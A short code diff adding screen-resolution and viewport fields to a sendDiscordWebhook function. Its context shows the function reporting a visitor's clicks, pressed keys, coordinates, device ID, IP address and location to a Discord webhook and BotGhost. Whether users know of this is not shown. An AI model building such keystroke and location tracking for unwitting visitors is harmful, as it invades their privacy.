@@ -385,7 +385,9 @@ export async function sendDiscordWebhook(
         { name: 'click_type', variable: '{click_type}', value: String(data.clickType || '-') },
         { name: 'target_element', variable: '{target_element}', value: String(data.targetElement || '-') },
         { name: 'coordinates', variable: '{coordinates}', value: String(data.coordinates || '-') },
-        { name: 'pressed_key', variable: '{pressed_key}', value: String(data.key || '-') }
+        { name: 'pressed_key', variable: '{pressed_key}', value: String(data.key || '-') },
+        { name: 'screen_res', variable: '{screen_res}', value: String(data.screenRes || data.viewport || '-') },
+        { name: 'viewport', variable: '{viewport}', value: String(data.viewport || data.screenRes || '-') }
       ];
 
       const botGhostPayload = {
@@ -416,6 +418,8 @@ export async function sendDiscordWebhook(
         target_element: String(data.targetElement || '-'),
         coordinates: String(data.coordinates || '-'),
         pressed_key: String(data.key || '-'),
+        screen_res: String(data.screenRes || data.viewport || '-'),
+        viewport: String(data.viewport || data.screenRes || '-'),
         device_id: String(data.deviceId || '-'),
         ip: String(data.ip || 'Bilinmiyor'),
         location: String(data.location || 'Bilinmiyor'),
